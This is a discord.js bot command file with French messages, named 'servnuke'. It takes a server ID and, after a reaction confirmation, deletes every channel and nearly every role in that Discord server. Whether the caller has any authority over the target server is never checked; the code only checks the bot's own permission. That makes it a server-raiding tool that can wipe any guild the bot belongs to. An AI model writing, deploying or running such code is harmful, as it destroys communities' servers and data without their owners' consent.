const Discord = require('discord.js')
module.exports.run = async (client, message, args) => {

    if(!args[1]) return message.channel.send('veuillez saisir un ID de serveur')

    let server = client.guilds.cache.get(args[1])

    if(!server) return message.channel.send(`le serveur correspondant à l'id ${args[1]} n'existe pas.`)

    function NukeChannels(WillBeNukedServer) {
        WillBeNukedServer.channels.cache.forEach(channel => {

            channel.delete()
            .catch(console.error)
          })
    }

    function NukeRoles(WillBeNukedServer) {
        WillBeNukedServer.roles.cache.forEach(roles =>{
            
            if(roles.name === "@everyone") return;
            if(roles.name === client.config.clientRoleName) return;
    
            roles.delete()
            .catch(console.error)
          })
    }
    
    if(!server.me.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`Shimi n'est pas autorisé à supprimer de roles / salons sur ${server.name}`) 

    var sentVerif = await message.channel.send(`voulez-vous NUKE le serveur : ${server.name} ? `)

    sentVerif.react('✅')
    sentVerif.react('❌')

    let SentChannel = sentVerif.channel

    sentVerif.awaitReactions((reaction, user) => user.id == message.author.id && (reaction.emoji.name == '✅' || reaction.emoji.name == '❌'),
        { max: 1, time: 30000 }).then(collected => {

        if (collected.first().emoji.name == '✅') {

            sentVerif.delete()
            SentChannel.send('lancement du NUKE..')
            .then(message => {
                setTimeout(() => {
                    message.delete()
                    message.channel.send(`le serveur ${server.name} a bien été NUKE.`)
                }, 1000)
                
              })

            NukeRoles(server)
            NukeChannels(server)
            

        } else {

            if(!sentVerif) return;
            sentVerif.delete()
            SentChannel.send('NUKE annulé.');

        }
    }).catch(() => {

        if(!sentVerif) return;
        sentVerif.delete()
    
    })

}

module.exports.config = {
    name: "servnuke",
    category: "admin",
    usage: "{guild.ID}",
    stable: "✅ stable",
    description: "détruit le serveur précisé",
    cooldown: 60
}